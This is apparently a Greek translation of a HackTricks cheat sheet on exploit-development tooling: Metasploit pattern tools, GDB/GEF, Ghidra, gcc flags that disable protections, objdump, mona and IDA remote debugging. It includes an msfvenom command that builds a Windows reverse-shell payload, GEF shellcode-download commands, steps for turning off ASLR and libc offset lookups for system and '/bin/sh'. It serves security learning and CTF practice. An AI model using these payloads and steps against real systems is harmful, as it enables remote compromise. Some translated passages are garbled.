<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## Shellcodes

Οι shellcodes είναι μικρά κομμάτια κώδικα που συνήθως χρησιμοποιούνται σε επιθέσεις εκμεταλλευόμενοι ευπάθειες σε λογισμικό. Ο σκοπός τους είναι να εκτελέσουν επιθετικές ενέργειες στον στόχο, όπως η λήψη του ελέγχου του συστήματος ή η εκτέλεση κακόβουλου κώδικα.

Οι shellcodes συνήθως γράφονται σε γλώσσες προγραμματισμού χαμηλού επιπέδου, όπως η αρχιτεκτονική αρχείων (assembly), προκειμένου να είναι αποτελεσματικοί και να μπορούν να εκτελεστούν απευθείας από τον επεξεργαστή. Οι shellcodes μπορούν να χρησιμοποιηθούν για να εκμεταλλευτούν ευπάθειες όπως buffer overflows, format string vulnerabilities και heap overflows.

Για τη δημιουργία shellcodes, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το Metasploit Framework, το msfvenom και το Shellcode Compiler. Αυτά τα εργαλεία σας επιτρέπουν να δημιουργήσετε shellcodes για διάφορες αρχιτεκτονικές επεξεργαστών και λειτουργικά συστήματα.

Είναι σημαντικό να θυμάστε ότι η χρήση shellcodes για παράνομες ενέργειες είναι παράνομη και απαράδεκτη. Οι shellcodes πρέπει να χρησιμοποιούνται μόνο για νόμιμους σκοπούς, όπως η δοκιμή ασφάλειας (pentesting) ή η ενίσχυση της ασφάλειας του συστήματος.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## Εγκατάσταση

Για να εγκαταστήσετε το GDB, ακολουθήστε τα παρακάτω βήματα:

1. Ανοίξτε το τερματικό σας.
2. Εκτελέστε την ακόλουθη εντολή για να εγκαταστήσετε το GDB:

   ```
   sudo apt-get install gdb
   ```

3. Αναμένετε να ολοκληρωθεί η εγκατάσταση.

Αυτό είναι όλο! Τώρα έχετε εγκαταστήσει το GDB στο σύστημά σας.
```
apt-get install gdb
```
## Παράμετροι

**-q** --> Να μην εμφανίζεται το banner\
**-x \<αρχείο>** --> Αυτόματη εκτέλεση εντολών GDB από εδώ\
**-p \<pid>** --> Σύνδεση σε διεργασία

### Εντολές

\> **disassemble main** --> Αποσυναρμολόγηση της συνάρτησης\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> Ακολούθηση δημιουργημένης διεργασίας\
\> **p system** --> Εύρεση της διεύθυνσης της συνάρτησης system\
\> **help**\
\> **quit**

\> **br func**  --> Προσθήκη σημείου αναστολής στη συνάρτηση\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> Διαγραφή αριθμού br\
\> **watch EXPRESSION** --> Διακοπή εάν αλλάξει η τιμή

**> run** --> Εκτέλεση\
**> start** --> Έναρξη και αναστολή στη main\
\> **n/next** --> Εκτέλεση επόμενης εντολής (χωρίς εσωτερικά)\
\> **s/step** --> Εκτέλεση επόμενης εντολής\
\> **c/continue** --> Συνέχιση μέχρι το επόμενο σημείο αναστολής

\> **set $eip = 0x12345678** --> Αλλαγή της τιμής του $eip\
\> **info functions** --> Πληροφορίες για τις συναρτήσεις\
\> **info functions func** --> Πληροφορίες για τη συνάρτηση\
\> **info registers** --> Τιμή των μητρώων\
\> **bt** --> Στοίβα\
\> **bt full** --> Λεπτομερής στοίβα

\> **print variable**\
\> **print 0x87654321 - 0x12345678** --> Υπολογισμός\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> Εμφάνιση περιεχομένου σε οκταδική/εξαδική/δεκαδική/δυαδική/εντολή/ASCII μορφή

* **x/o 0xDir\_hex**
* **x/2x $eip** --> 2 λέξεις από το EIP
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)
* **i r eip** --> Τιμή του $eip
* **x/w pointer** --> Τιμή του δείκτη
* **x/s pointer** --> Συμβολοσειρά που δείχνει ο δείκτης
* **x/xw \&pointer** --> Διεύθυνση όπου βρίσκεται ο δείκτης
* **x/i $eip** —> Εντολές του EIP

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## Κόλπα

### Ίδιες διευθύνσεις στο GDB

Κατά την αποσφαλμάτωση, το GDB θα έχει **ελαφρώς διαφορετικές διευθύνσεις από αυτές που χρησιμοποιεί το δυαδικό αρχείο κατά την εκτέλεσή του.** Μπορείτε να κάνετε το GDB να έχει τις ίδιες διευθύνσεις κάνοντας τα εξής:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<path>` _Βάλτε την απόλυτη διαδρομή προς το δυαδικό αρχείο_
* Εκμεταλλευτείτε το δυαδικό αρχείο χρησιμοποιώντας την ίδια απόλυτη διαδρομή
* Τα `PWD` και `OLDPWD` πρέπει να είναι τα ίδια όταν χρησιμοποιείτε το GDB και όταν εκμεταλλεύεστε το δυαδικό αρχείο

### Ανίχνευση των κλήσεων συναρτήσεων με backtrace

Όταν έχετε ένα **συνδεδεμένο δυαδικό αρχείο**, όλες οι συναρτήσεις θα ανήκουν στο δυαδικό αρχείο (και όχι σε εξωτερικές βιβλιοθήκες). Σε αυτήν την περίπτωση, θα είναι δύσκολο να **αναγνωρίσετε τη ροή που ακολουθεί το δυαδικό αρχείο για παράδειγμα για να ζητήσει είσοδο από τον χρήστη**.\
Μπορείτε εύκολα να αναγνωρίσετε αυτήν τη ροή **τρέχοντας** το δυαδικό αρχείο με το **gdb** μέχρι να σας ζητηθεί είσοδος. Στη συνέχεια, σταματήστε το πατώντας **CTRL+C** και χρησιμοποιήστε την εντολή **`bt`** (**backtrace**) για να δείτε τις κληθείσες συναρτήσεις:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## GDB server

`gdbserver --multi 0.0.0.0:23947` (στο IDA πρέπει να συμπληρώσετε την απόλυτη διαδρομή του εκτελέσιμου στο μηχάνημα Linux και στο μηχάνημα Windows)

# Ghidra

## Εύρεση μετατόπισης στοίβας

**Το Ghidra** είναι πολύ χρήσιμο για να βρείτε τη **μετατόπιση** για ένα **buffer overflow χάρη στις πληροφορίες για τη θέση των τοπικών μεταβλητών.**\
Για παράδειγμα, στο παρακάτω παράδειγμα, ένα buffer overflow στο `local_bc` υποδηλώνει ότι χρειάζεστε μια μετατόπιση της τάξης του `0xbc`. Επιπλέον, αν το `local_10` είναι ένα canary cookie, υποδηλώνει ότι για να το αντικαταστήσετε από το `local_bc` υπάρχει μια μετατόπιση της τάξης του `0xac`.\
_Να θυμάστε ότι το πρώτο 0x08 από όπου αποθηκεύεται το RIP ανήκει στο RBP._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Μεταγλώττιση χωρίς προστασίες\
**-o** --> Έξοδος\
**-g** --> Αποθήκευση κώδικα (το GDB θα μπορεί να τον δει)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Απενεργοποίηση του ASLR στο Linux

**Για να μεταγλωττίσετε ένα shellcode:**\
**nasm -f elf assembly.asm** --> επιστρέφει ένα ".o"\
**ld assembly.o -o shellcodeout** --> Εκτελέσιμο

# Objdump

**-d** --> Αποσυναρμολόγηση ενοτήτων εκτελέσιμου (δείτε τους κωδικούς ενός μεταγλωττισμένου shellcode, βρείτε ROP Gadgets, βρείτε διεύθυνση συνάρτησης...)\
**-Mintel** --> Σύνταξη **Intel**\
**-t** --> Πίνακας **συμβόλων**\
**-D** --> Αποσυναρμολόγηση όλων (διεύθυνση στατικής μεταβλητής)\
**-s -j .dtors** --> ενότητα dtors\
**-s -j .got** --> ενότητα got\
\-D -s -j .plt --> **plt** ενότητα **αποσυναρμολογημένη**\
**-TR** --> **Ανακατατάξεις**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Διεύθυνση του "puts" για τροποποίηση στο GOT\
**objdump -D ./exec | grep "VAR\_NAME"** --> Διεύθυνση μιας στατικής μεταβλητής (αυτές αποθηκεύονται στην ενότητα DATA).

# Core dumps

1. Εκτελέστε `ulimit -c unlimited` πριν ξεκινήσετε το πρόγραμμά μου
2. Εκτελέστε `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

# More

**ldd executable | grep libc.so.6** --> Διεύθυνση (αν υπάρχει ASLR, τότε αλλάζει κάθε φορά)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Επανάληψη για να δείτε αν η διεύθυνση αλλάζει πολύ\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Μετατόπιση του "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Μετατόπιση του "/bin/sh"

**strace executable** --> Συναρτήσεις που καλούνται από το εκτελέσιμο\
**rabin2 -i ejecutable -->** Διεύθυνση όλων των συναρτήσεων

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## Αποσφαλμάτωση σε απομακρυσμένο Linux

Μέσα στον φάκελο του IDA μπορείτε να βρείτε δυαδικά αρχεία που μπορούν να χρησιμοποιηθούν για να γίνει αποσφαλμάτωση ενός δυαδικού αρχείου σε ένα Linux σύστημα. Για να το κάνετε αυτό, μεταφέρετε το δυαδικό αρχείο _linux\_server_ ή _linux\_server64_ στον διακομιστή Linux και εκτελέστε το μέσα στον φάκελο που περιέχει το δυαδικό αρχείο:
```
./linux_server64 -Ppass
```
Στη συνέχεια, ρυθμίστε τον αποσφαλματωτή: Αποσφαλματωτής (απομακρυσμένος linux) -> Επιλογές διεργασίας...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
